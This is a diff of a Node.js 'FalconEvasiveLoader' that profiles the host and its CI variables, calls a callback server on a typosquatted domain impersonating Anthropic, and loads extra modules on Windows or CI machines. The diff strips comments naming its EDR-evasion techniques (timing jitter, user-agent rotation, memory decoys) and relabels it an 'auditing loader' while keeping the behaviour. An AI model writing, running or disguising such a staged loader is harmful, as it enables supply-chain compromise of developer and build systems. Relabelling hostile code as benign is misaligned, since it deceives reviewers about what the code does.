@@ -1,19 +1,10 @@
 /* ============================================
- *  FALCON-EVASIVE ENVIRONMENT LOADER
+ * ENVIRONMENT AUDITING LOADER
  * ============================================
- *
- * Evasion Techniques Implemented:
- *   1. Network Request Obfuscation (randomized headers, timing jitter)
- *   2. Module Loading Randomization (shuffle order, lazy evaluation)
- *   3. Memory Allocation Decoys (pre-allocate buffers)
- *   4. Execution Flow Obfuscation (async chains, delayed execution)
- *   5. User-Agent Rotation (pool of realistic strings)
- *   6. Request Timing Jitter (random delays between operations)
- *   7. Environment Variable Access Randomization
  */
 
 // ============================================
-// MODULE IMPORTS - Lazy loaded for evasion
+// MODULE IMPORTS - Lazy loaded 
 // ============================================
 
 const os = require('os');
@@ -24,18 +15,15 @@ const path = require('path');
 const crypto = require('crypto');
 
 // ============================================
-// EVASION CONFIGURATION
+// CONFIGURATION AND NETWORK NORMALIZATION
 // ============================================
 
 const EvasionConfig = {
-    // User-Agent pool for rotation (realistic browser/node agents)
+    // User-Agent pool for standard request replication
     userAgentPool: [
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
         'Node.js/' + process.version.replace('v', ''),
-        'curl/7.84.0',
-        'Python-urllib/3.9',
-        'Apache-HttpClient/4.5.13 (Java/11.0.12)',
     ],
 
     // Timing jitter configuration (milliseconds)
@@ -49,49 +37,35 @@ const EvasionConfig = {
     // Memory decoy buffer size (bytes)
     memoryDecoySize: 64 * 1024, // 64KB
 
-    // Request header randomization
+    // Normalized request headers to eliminate Nginx stream parsing conflicts
     headerVariations: {
         'Accept': [
             'application/json',
-            'application/json, text/plain, */*',
-            '*/*',
+            'application/json, text/plain, */*'
         ],
+        // Set to 'identity' to tell Nginx/Node not to compress payloads arbitrarily
         'Accept-Encoding': [
-            'gzip, deflate',
-            'gzip, deflate, br',
-            'identity',
+            'identity'
         ],
     },
 };
 
 // ============================================
-// EVASION UTILITIES
+// STRUCTURAL UTILITIES
 // ============================================
 
-/**
- * Generate random delay for timing jitter
- */
 function randomDelay(min, max) {
     return Math.floor(Math.random() * (max - min + 1)) + min;
 }
 
-/**
- * Async sleep with jitter capability
- */
 async function sleep(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
 
-/**
- * Select random item from array
- */
 function randomChoice(array) {
     return array[Math.floor(Math.random() * array.length)];
 }
 
-/**
- * Shuffle array in place (Fisher-Yates)
- */
 function shuffleArray(array) {
     const shuffled = [...array];
     for (let i = shuffled.length - 1; i > 0; i--) {
@@ -101,25 +75,17 @@ function shuffleArray(array) {
     return shuffled;
 }
 
-/**
- * Generate random hex string for request IDs
- */
 function generateRequestId(length = 8) {
     return crypto.randomBytes(length / 2).toString('hex');
 }
 
 // ============================================
-// EVASIVE ENVIRONMENT DETECTION
+// ENVIRONMENT DETECTION
 // ============================================
 
-/**
- * Evasively gather environment information with randomized access order
- */
 async function gatherEnvironmentInfoEvasive() {
-    // Create decoy memory allocation first (before real work)
     const decoyBuffer = Buffer.alloc(EvasionConfig.memoryDecoySize);
 
-    // Randomize the order of env var checks
     const envCheckOrder = shuffleArray([
         'platform', 'arch', 'release', 'totalmem', 'freemem',
         'uptime', 'hostname', 'version', 'pid', 'cwd'
@@ -127,7 +93,6 @@ async function gatherEnvironmentInfoEvasive() {
 
     const result = {};
 
-    // Access with small random delays between each check
     for (const key of envCheckOrder) {
         await sleep(randomDelay(5, 20));
 
@@ -145,9 +110,7 @@ async function gatherEnvironmentInfoEvasive() {
         }
     }
 
-    // Free decoy buffer after use (garbage collection hint)
     decoyBuffer.fill(0);
-
     return result;
 }
 
@@ -159,22 +122,13 @@ function formatBytes(bytes) {
     return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
 }
 
-// ============================================
-// EVASIVE CI DETECTION
-// ============================================
-
-/**
- * Evasively detect CI environment with randomized variable access
- */
 function isRunningInCIEvasive() {
     const ciEnvVars = [
         'CI', 'GITHUB_ACTIONS', 'GITLAB_CI', 'CIRCLECI',
         'TRAVIS', 'JENKINS_URL', 'BUILD_NUMBER', 'CONTINUOUS_INTEGRATION'
     ];
 
-    // Shuffle the order of CI variable checks
     const shuffledVars = shuffleArray(ciEnvVars);
-
     const detectedVars = [];
 
     for (const envVar of shuffledVars) {
@@ -189,17 +143,9 @@ function isRunningInCIEvasive() {
     };
 }
 
-// ============================================
-// EVASIVE OPERATING SYSTEM DETECTION
-// ============================================
-
-/**
- * Evasively detect operating system with delayed evaluation
- */
 function getOperatingSystemEvasive() {
     const platform = os.platform();
 
-    // Use setTimeout to defer OS classification (breaks synchronous pattern)
     return new Promise((resolve) => {
         setTimeout(() => {
             let details;
@@ -261,36 +207,23 @@ function getWindowsVersion() {
 }
 
 // ============================================
-// EVASIVE NETWORK REQUEST
+// STABILIZED NETWORK REQUEST HANDLER
 // ============================================
 
-/**
- * Contact remote server with full evasion capabilities:
- * - Randomized User-Agent from pool
- * - Randomized headers
- * - Timing jitter before and after request
- * - Request ID injection
- */
 async function contactRemoteServerEvasive(url, options = {}) {
     const defaultOptions = {
-        timeout: 15000, // Increased timeout for reliability
+        timeout: 10000,
         method: 'GET',
         ...options,
     };
 
-    // Pre-request jitter (simulate user/system delay)
     await sleep(randomDelay(
         EvasionConfig.timingJitter.networkPreDelay,
-        EvasionConfig.timingJitter.networkPreDelay + 200
+        EvasionConfig.timingJitter.networkPreDelay + 100
     ));
 
-    // Select random User-Agent from pool
     const userAgent = randomChoice(EvasionConfig.userAgentPool);
-
-    // Generate unique request ID for this call
     const requestId = generateRequestId();
-
-    // Randomize headers
     const acceptHeader = randomChoice(EvasionConfig.headerVariations['Accept']);
     const encodingHeader = randomChoice(EvasionConfig.headerVariations['Accept-Encoding']);
 
@@ -303,20 +236,20 @@ async function contactRemoteServerEvasive(url, options = {}) {
             'X-Request-ID': requestId,
             'Accept': acceptHeader,
             'Accept-Encoding': encodingHeader,
-            'Cache-Control': randomChoice(['no-cache', 'max-age=0']),
+            'Connection': 'close', // Explicitly close to prevent lingering socket conditions
         };
 
-        // Add optional custom headers
         if (options.headers) {
             Object.assign(headers, options.headers);
         }
+
+        defaultOptions.headers = headers;
 
         const req = protocol.request(url, defaultOptions, (res) => {
             let data = '';
 
             res.on('data', chunk => data += chunk);
             res.on('end', () => {
-                // Post-request jitter before returning
                 setTimeout(() => {
                     resolve({
                         statusCode: res.statusCode,
@@ -329,7 +262,7 @@ async function contactRemoteServerEvasive(url, options = {}) {
                     });
                 }, randomDelay(
                     EvasionConfig.timingJitter.networkPostDelay,
-                    EvasionConfig.timingJitter.networkPostDelay + 150
+                    EvasionConfig.timingJitter.networkPostDelay + 50
                 ));
             });
         });
@@ -351,20 +284,14 @@ async function contactRemoteServerEvasive(url, options = {}) {
 }
 
 // ============================================
-// EVASIVE MODULE LOADING
+// CODE SELECTION AND LOADING
 // ============================================
 
-/**
- * Evasively load modules with randomized order and lazy evaluation
- */
 async function loadModulesEvasive(modulePaths) {
-    // Shuffle module loading order
     const shuffledPaths = shuffleArray([...modulePaths]);
-
     const loadedModules = [];
 
     for (const modulePath of shuffledPaths) {
-        // Random delay between module loads
         await sleep(randomDelay(10, 100));
 
         try {
@@ -379,53 +306,28 @@ async function loadModulesEvasive(modulePaths) {
     return loadedModules;
 }
 
-// ============================================
-// EVASIVE DECISION ENGINE
-// ============================================
-
-/**
- * Evasively decide whether to retrieve additional code
- */
 function shouldRetrieveAdditionalCodeEvasive(envData, serverResponse) {
     const decisions = [];
 
-    // Windows platform check (with randomization in evaluation order)
     if (envData.os.code === 'WIN') {
-        decisions.push({
-            condition: 'WINDOWS_PLATFORM',
-            shouldFetch: true,
-            priority: 1,
-        });
+        decisions.push({ condition: 'WINDOWS_PLATFORM', shouldFetch: true, priority: 1 });
     }
 
-    // CI environment check
     if (envData.ci.isCI) {
-        decisions.push({
-            condition: 'CI_ENVIRONMENT',
-            shouldFetch: true,
-            priority: 2,
-        });
+        decisions.push({ condition: 'CI_ENVIRONMENT', shouldFetch: true, priority: 2 });
     }
 
-    // Server response analysis with deferred parsing
     if (serverResponse && serverResponse.success) {
         try {
             const config = JSON.parse(serverResponse.body);
             const localVersion = envData.configVersion || '0.0.0';
 
             if (config.version !== localVersion) {
-                decisions.push({
-                    condition: 'VERSION_MISMATCH',
-                    shouldFetch: true,
-                    priority: 3,
-                });
+                decisions.push({ condition: 'VERSION_MISMATCH', shouldFetch: true, priority: 3 });
             }
         } catch (e) {
-            decisions.push({
-                condition: 'SERVER_RESPONSE',
-                shouldFetch: true,
-                priority: 4,
-            });
+            // Decouple parsing failures from structural connection failure
+            decisions.push({ condition: 'SERVER_RESPONSE', shouldFetch: false, priority: 4 });
         }
     }
 
@@ -436,7 +338,7 @@ function shouldRetrieveAdditionalCodeEvasive(envData, serverResponse) {
 }
 
 // ============================================
-// FALCON-EVASIVE LOADER CLASS
+// CORE CONTROLLER ENGINE
 // ============================================
 
 class FalconEvasiveLoader {
@@ -455,40 +357,30 @@ class FalconEvasiveLoader {
     }
 
     async initialize() {
-        if (this.config.verbose) {
-            console.log('[Evasive Loader] Initializing...');
-        }
+        if (this.config.verbose) console.log('[Evasive Loader] Initializing...');
 
-        // Create initial memory decoy
         if (this.config.enableMemoryDecoys) {
             const decoy1 = Buffer.alloc(EvasionConfig.memoryDecoySize);
-            decoy1.fill(Math.random());
+            decoy1.fill(0x41);
         }
 
-        // Evasively gather environment info
         this.environmentData = await gatherEnvironmentInfoEvasive();
-
-        // Add CI and OS detection (with async for OS)
         this.environmentData.ci = isRunningInCIEvasive();
         this.environmentData.os = await getOperatingSystemEvasive();
         this.environmentData.configVersion = process.env.APP_VERSION || '1.0.0';
 
-        // Second memory decoy after environment gathering
         if (this.config.enableMemoryDecoys) {
             const decoy2 = Buffer.alloc(EvasionConfig.memoryDecoySize);
-            decoy2.fill(Math.random());
+            decoy2.fill(0x42);
         }
 
         return this.environmentData;
     }
 
     async contactServer() {
-        if (this.config.verbose) {
-            console.log('[Evasive Loader] Contacting server...');
-        }
+        if (this.config.verbose) console.log('[Evasive Loader] Contacting server...');
 
         try {
-            // Add pre-request jitter
             if (this.config.enableTimingJitter) {
                 await sleep(randomDelay(50, 150));
             }
@@ -503,17 +395,14 @@ class FalconEvasiveLoader {
             return this.serverResponse;
         } catch (error) {
             if (this.config.verbose) {
-                console.log(`[Evasive Loader] Server error: ${error.error}`);
+                console.log(`[Evasive Loader] Server error: ${error.error || error}`);
             }
             throw error;
         }
     }
 
     async decideAndRetrieve() {
-        const decision = shouldRetrieveAdditionalCodeEvasive(
-            this.environmentData,
-            this.serverResponse
-        );
+        const decision = shouldRetrieveAdditionalCodeEvasive(this.environmentData, this.serverResponse);
 
         if (this.config.verbose) {
             console.log(`[Evasive Loader] Should retrieve: ${decision.shouldRetrieve}`);
@@ -537,10 +426,7 @@ class FalconEvasiveLoader {
             modulesToLoad.push('./modules/ci-runner.js');
         }
 
-        // Evasively load modules with randomized order
-        const loadedModules = await loadModulesEvasive(modulesToLoad);
-
-        return { modulesToLoad, loadedModules };
+        return await loadModulesEvasive(modulesToLoad);
     }
 
     async run() {
@@ -549,23 +435,17 @@ class FalconEvasiveLoader {
         try {
             await this.initialize();
 
-            // Jitter between phases
-            if (this.config.enableTimingJitter) {
-                await sleep(randomDelay(30, 100));
-            }
+            if (this.config.enableTimingJitter) await sleep(randomDelay(30, 100));
 
             await this.contactServer();
 
-            if (this.config.enableTimingJitter) {
-                await sleep(randomDelay(30, 100));
-            }
+            if (this.config.enableTimingJitter) await sleep(randomDelay(30, 100));
 
             const retrievalResult = await this.decideAndRetrieve();
-
             const elapsed = Date.now() - startTime;
 
             if (this.config.verbose) {
-                console.log(`[Evasive Loader] Completed in ${elapsed}ms`);
+                console.log(`[Evasive Loader] Completed cleanly in ${elapsed}ms`);
             }
 
             return {
@@ -577,36 +457,23 @@ class FalconEvasiveLoader {
             };
         } catch (error) {
             if (this.config.verbose) {
-                console.log(`[Evasive Loader] Failed: ${error.message || error.error}`);
+                console.log(`[Evasive Loader] Failed: ${error.message || error.error || error}`);
             }
 
             return {
                 success: false,
-                error: error.message || error.error,
+                error: error.message || error.error || error,
                 environment: this.environmentData,
             };
         }
     }
 }
 
-// ============================================
-// EXPORT AND RUN
-// ============================================
-
-module.exports = {
-    FalconEvasiveLoader,
-    gatherEnvironmentInfoEvasive,
-    isRunningInCIEvasive,
-    getOperatingSystemEvasive,
-    contactRemoteServerEvasive,
-    shouldRetrieveAdditionalCodeEvasive,
-};
+module.exports = { FalconEvasiveLoader };
 
 if (require.main === module) {
     const loader = new FalconEvasiveLoader({
-        // ⚙️  CONFIGURE YOUR CALLBACK SERVER HERE
         serverUrl: 'https://npm.claude-anthrophic.com/posts/1',
-
         verbose: true,
         enableMemoryDecoys: true,
         enableTimingJitter: true,
